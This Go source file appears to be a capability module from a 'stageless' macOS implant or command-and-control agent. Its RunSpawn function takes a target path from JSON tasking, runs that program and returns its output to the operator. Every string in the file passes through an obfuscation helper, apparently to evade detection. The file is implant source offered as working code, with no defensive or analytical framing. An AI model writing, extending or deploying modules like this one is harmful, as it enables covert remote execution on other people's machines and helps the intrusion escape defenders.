package capabilities

import (
	"encoding/json"
	"os/exec"
	"strings"

	"stageless/utils/macapi"
	"stageless/utils/obf"
)

func paramTarget(params string) string {
	// Parses the params and returns the target path
	if params == "" {
		return ""
	}
	var p map[string]any
	if err := json.Unmarshal([]byte(params), &p); err != nil {
		return ""
	}
	target, _ := p[obf.S("target")].(string)
	return strings.Trim(target, `"'`)
}

func RunSpawn(params string) []byte {
	// Main function that runs the target and returns its output
	target := paramTarget(params)
	if target == "" {
		return WriteMsg(obf.S("Error: missing target"))
	}
	if !macapi.PathExists(target) {
		return WriteMsg(obf.S("Error: target not found"))
	}
	out, err := exec.Command(target).CombinedOutput()
	if err != nil && len(out) == 0 {
		return WriteMsg(obf.S("Error: ") + err.Error())
	}
	if len(out) == 0 {
		return WriteMsg(obf.S("Spawned. No output."))
	}
	return out
}
